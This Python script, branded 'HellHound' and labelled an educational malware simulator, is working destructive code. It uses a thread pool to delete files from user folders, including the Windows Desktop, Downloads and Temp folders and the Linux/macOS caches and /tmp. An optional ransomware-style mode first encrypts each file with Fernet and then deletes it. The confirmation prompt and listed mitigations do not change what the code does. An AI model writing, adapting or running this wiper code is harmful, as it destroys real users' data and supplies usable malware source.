import os
import sys
import platform
import time
import shutil
import glob
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.fernet import Fernet
import json
from datetime import datetime
import threading

# Configuration
LOG_FREQUENCY = 50
MAX_FILES_LIMIT = 5000
DELAY_BETWEEN_DELETIONS = 0.0001  # Reduced for faster execution
MAX_WORKERS = 8  # Thread pool size
ENCRYPTION_KEY_FILE = "hellhound_key.key"
REPORT_FILE = "hellhound_report.json"

# Thread-safe counters
deletion_lock = threading.Lock()
stats = {
    "total_files_deleted": 0,
    "total_dirs_deleted": 0,
    "total_encrypted": 0,
    "total_size_deleted": 0,
    "total_size_encrypted": 0,
    "errors": 0,
    "start_time": None,
    "end_time": None
}

def display_hellhound_message():
    """Display HellHound message - educational warning"""
    print("\033[91m" + "="*60)
    print("     CYBER DOGS HELLHOUND - EDUCATIONAL DEMONSTRATION")
    print("     [ENHANCED: Threading + Encryption Module]")
    print("="*60 + "\033[0m")
    print("\n\033[91m💀 SYSTEM INFECTION SIMULATION 💀\033[0m")
    print("This is a DESTRUCTIVE demonstration tool.")
    print("⚠️  EDUCATIONAL USE ONLY - NOT STEALTHY BY DESIGN ⚠️")
    print("\n\033[93mCyberdogs HellHound has been released.")
    print("Demonstrating file destruction & encryption capabilities...\033[0m")
    print("\n" + "="*60)
    time.sleep(2)

def generate_encryption_key():
    """Generate a Fernet encryption key for file encryption"""
    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, 'wb') as f:
        f.write(key)
    print(f"\033[93m[+] Encryption key generated and saved: {ENCRYPTION_KEY_FILE}\033[0m")
    return key

def load_encryption_key():
    """Load encryption key or generate new one.

    Raises:
        ValueError: If the key file exists but is corrupt. It is NOT
            overwritten — delete it yourself to generate a fresh one.
    """
    if os.path.exists(ENCRYPTION_KEY_FILE):
        with open(ENCRYPTION_KEY_FILE, 'rb') as f:
            key = f.read()
        try:
            Fernet(key)  # validate before any real use
        except (ValueError, TypeError) as exc:
            raise ValueError(
                f"key file {ENCRYPTION_KEY_FILE} is corrupt — "
                "delete it to generate a fresh one"
            ) from exc
        return key
    else:
        return generate_encryption_key()

def encrypt_file(filepath, cipher):
    """
    Encrypt a file before deletion.
    
    Args:
        filepath (str): Path to file to encrypt
        cipher: Fernet cipher instance
    
    Returns:
        bool: True if encryption successful
    """
    try:
        if not os.path.isfile(filepath) or os.path.getsize(filepath) == 0:
            return False
            
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        encrypted_data = cipher.encrypt(file_data)

        with open(filepath, 'wb') as f:
            f.write(encrypted_data)

        return True
    except (Exception, MemoryError):
        # MemoryError is a BaseException, NOT caught by `except Exception`.
        # Files larger than available RAM raise it in f.read(); skipping the
        # file here keeps it from escaping every handler and killing the run.
        # Data-safe: encryption fails before anything is written or removed.
        with deletion_lock:
            stats["errors"] += 1
        return False

def delete_file_worker(filepath, cipher=None, encrypt_before_delete=False):
    """
    Worker function for threaded file deletion with optional encryption.
    
    Args:
        filepath (str): Path to file to delete
        cipher: Fernet cipher instance (optional)
        encrypt_before_delete (bool): Encrypt before deletion
    
    Returns:
        dict: Operation results
    """
    global stats
    
    result = {
        "path": filepath,
        "deleted": False,
        "encrypted": False,
        "size": 0,
        "error": None
    }
    
    try:
        if not os.path.isfile(filepath) or os.path.islink(filepath):
            return result
        
        file_size = os.path.getsize(filepath)
        result["size"] = file_size
        
        # Encrypt if requested and cipher available
        # (encrypt_file swallows its own errors and returns False, so no
        # try/except is needed here)
        if encrypt_before_delete and cipher:
            if encrypt_file(filepath, cipher):
                result["encrypted"] = True
                with deletion_lock:
                    stats["total_encrypted"] += 1
                    stats["total_size_encrypted"] += file_size
        
        # Delete the file
        os.remove(filepath)
        result["deleted"] = True
        
        with deletion_lock:
            stats["total_files_deleted"] += 1
            stats["total_size_deleted"] += file_size
        
        time.sleep(DELAY_BETWEEN_DELETIONS)
        return result
        
    except PermissionError:
        result["error"] = "Permission denied"
        with deletion_lock:
            stats["errors"] += 1
    except FileNotFoundError:
        pass  # Already deleted
    except OSError as e:
        result["error"] = str(e)
        with deletion_lock:
            stats["errors"] += 1
    
    return result

def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_delete=False, max_files=MAX_FILES_LIMIT):
    """
    Recursively delete files from a directory using threading.
    
    Args:
        target_dir (str): Directory to clean
        cipher: Fernet cipher instance (optional)
        encrypt_before_delete (bool): Encrypt files before deletion
        max_files (int): Maximum files to process
    
    Returns:
        tuple: (files_deleted, directories_cleaned)
    """
    global stats

    files_before = stats["total_files_deleted"]
    dirs_deleted = 0
    files_processed = 0
    
    print(f"\n\033[94m[*] Scanning directory: {target_dir}\033[0m")
    
    try:
        # Collect all files first
        file_list = []
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if files_processed >= max_files:
                    break
                filepath = os.path.join(root, file)
                file_list.append(filepath)
                files_processed += 1
            if files_processed >= max_files:
                break
        
        # Process files in parallel
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {
                executor.submit(delete_file_worker, fp, cipher, encrypt_before_delete): fp 
                for fp in file_list
            }
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % LOG_FREQUENCY == 0:
                    print(f"\033[93m[+] Processed {completed}/{len(file_list)} files...\033[0m")
                
                try:
                    result = future.result()
                except Exception as e:
                    pass
        
        # Clean up empty directories
        for root, dirs, files in os.walk(target_dir, topdown=False):
            for dir_name in dirs:
                dirpath = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dirpath):
                        os.rmdir(dirpath)
                        dirs_deleted += 1
                except (OSError, PermissionError):
                    pass
                    
    except PermissionError:
        print(f"\033[91m[!] Permission denied accessing {target_dir}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error processing {target_dir}: {e}\033[0m")
    
    return stats["total_files_deleted"] - files_before, dirs_deleted

def get_target_paths():
    """
    Get platform-specific target paths for deletion.
    Windows: Temp, AppData, Downloads, Desktop
    Linux/Mac: /tmp, home directory cache
    """
    system = platform.system()
    paths = []
    
    if system == "Windows":
        userprofile = os.getenv("USERPROFILE") or os.path.expanduser("~")
        
        paths = [
            os.path.join(userprofile, "AppData", "Local", "Temp"),
            os.path.join(userprofile, "Downloads"),
            os.path.join(userprofile, "Desktop"),
            os.path.join(userprofile, "AppData", "Roaming", "Microsoft", "Windows", "Recent"),
        ]
    elif system in ["Linux", "Darwin"]:  # Darwin is macOS
        home = os.path.expanduser("~")
        paths = [
            "/tmp",
            os.path.join(home, ".cache"),
            os.path.join(home, ".local", "share", "Trash"),
        ]
    
    # Filter to only existing paths
    return [p for p in paths if os.path.exists(p)]

def delete_system_files(encrypt_mode=False):
    """
    Delete system files across target directories using threading.
    
    Args:
        encrypt_mode (bool): Enable encryption before deletion
    
    Returns:
        dict: Statistics about deletion
    """
    global stats
    stats["start_time"] = datetime.now().isoformat()
    
    cipher = None
    if encrypt_mode:
        print("\n\033[95m[*] Encryption mode enabled\033[0m")
        try:
            key = load_encryption_key()
        except ValueError as e:
            print(f"\033[91m[!] {e}\033[0m")
            print("\033[91m[!] Refusing to encrypt with a corrupt key — "
                  "no files were touched.\033[0m")
            stats["end_time"] = datetime.now().isoformat()
            return stats
        cipher = Fernet(key)
        print(f"\033[93m[+] Cipher initialized for AES-256 encryption\033[0m")
    
    print("\n\033[91m" + "="*60)
    print("BEGINNING THREADED FILE DELETION SEQUENCE")
    print("="*60 + "\033[0m")
    
    target_paths = get_target_paths()
    
    if not target_paths:
        print("\033[91m[!] No target directories found!\033[0m")
        return stats
    
    start_time = time.time()
    
    for target_path in target_paths:
        print(f"\n\033[95m>>> Processing: {target_path}\033[0m")
        files_deleted, dirs_deleted = delete_directory_contents_threaded(
            target_path, 
            cipher, 
            encrypt_mode, 
            MAX_FILES_LIMIT
        )
        
        stats["total_dirs_deleted"] += dirs_deleted
        print(f"\033[92m[✓] Directory complete: {files_deleted} files deleted, {dirs_deleted} directories removed\033[0m")
    
    elapsed_time = time.time() - start_time
    stats["end_time"] = datetime.now().isoformat()
    stats["execution_time"] = elapsed_time
    
    return stats

def format_size(bytes):
    """Format bytes to human-readable size"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes < 1024.0:
            return f"{bytes:.2f} {unit}"
        bytes /= 1024.0
    return f"{bytes:.2f} PB"

def display_summary(stats):
    """Display final execution summary with metrics"""
    print("\n" + "="*60)
    print("\033[91m" + "HELLHOUND EXECUTION SUMMARY" + "\033[0m")
    print("="*60)
    
    print(f"\n📊 DESTRUCTION METRICS:")
    print(f"   Files Deleted: {stats['total_files_deleted']}")
    print(f"   Directories Removed: {stats['total_dirs_deleted']}")
    print(f"   Total Size Destroyed: {format_size(stats['total_size_deleted'])}")
    print(f"   Errors Encountered: {stats['errors']}")
    
    if stats['total_encrypted'] > 0:
        print(f"\n🔐 ENCRYPTION METRICS:")
        print(f"   Files Encrypted: {stats['total_encrypted']}")
        print(f"   Total Size Encrypted: {format_size(stats['total_size_encrypted'])}")
    
    if 'execution_time' in stats:
        print(f"\n⚡ PERFORMANCE METRICS:")
        print(f"   Execution Time: {stats['execution_time']:.2f} seconds")
        if stats['total_files_deleted'] > 0:
            deletion_rate = stats['total_files_deleted'] / stats['execution_time']
            print(f"   Deletion Rate: {deletion_rate:.2f} files/second")
    
    print(f"\n🖥️  SYSTEM INFORMATION:")
    print(f"   Platform: {platform.system()}")
    print(f"   Start Time: {stats['start_time']}")
    print(f"   End Time: {stats['end_time']}")
    
    print("\n" + "="*60)
    print("\033[91m[!] SYSTEM INFECTION SIMULATION COMPLETE\033[0m")
    print("\033[93m[*] This demonstration shows how modern malware:")
    print("    - Uses parallel processing for speed")
    print("    - Encrypts files before destruction (ransomware)")
    print("    - Operates transparently for educational visibility")
    print("    - In real attacks, this would be concealed.\033[0m")
    print("="*60 + "\n")

def generate_json_report(stats):
    """Generate machine-readable JSON report"""
    report = {
        "tool": "HellHound Malware Educational Simulator",
        "version": "2.0",
        "timestamp": datetime.now().isoformat(),
        "platform": platform.system(),
        "statistics": stats,
        "educational_context": {
            "purpose": "Demonstrate destructive malware capabilities",
            "techniques": ["File Deletion", "Encryption", "Parallel Processing", "Directory Traversal"],
            "mitigation": ["Backups", "Access Control", "Monitoring", "File Integrity Checking"]
        }
    }
    
    with open(REPORT_FILE, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\033[93m[+] JSON report generated: {REPORT_FILE}\033[0m")

def main():
    """Main execution function"""
    # stdout may be cp1252 (mojibake) or another narrow codec on some
    # Windows consoles; force UTF-8 so banner/demo output renders.
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass  # stdout without reconfigure (e.g. redirected); keep going
    try:
        # Display educational warning
        display_hellhound_message()
        
        # Ask user to select mode
        print("\n\033[95m[*] SELECT OPERATION MODE:\033[0m")
        print("   1) Deletion Only (Fast)")
        print("   2) Encryption + Deletion (Destructive)")
        
        mode_choice = input("\nEnter choice (1 or 2): ").strip()
        encrypt_mode = mode_choice == "2"
        
        # Confirm user intent
        print("\n\033[91m⚠️  WARNING: This will DELETE files from your system!\033[0m")
        if encrypt_mode:
            print("\033[91m⚠️  ENCRYPTION MODE ENABLED: Files will be encrypted before deletion!\033[0m")
        
        response = input("Continue? Type 'YES' to proceed: ").strip().upper()
        
        if response != "YES":
            print("\033[92m[*] Operation cancelled by user\033[0m")
            sys.exit(0)
        
        print("\033[91m[!] Proceeding with file deletion...\033[0m\n")
        
        # Execute deletion with threading
        execution_stats = delete_system_files(encrypt_mode=encrypt_mode)
        
        # Display summary
        display_summary(execution_stats)
        
        # Generate JSON report
        generate_json_report(execution_stats)
        
    except KeyboardInterrupt:
        print("\n\033[92m[*] HellHound interrupted by user\033[0m")
        stats["end_time"] = datetime.now().isoformat()
        generate_json_report(stats)
        sys.exit(0)
    except Exception as e:
        print(f"\033[91m[!] Fatal error: {e}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()
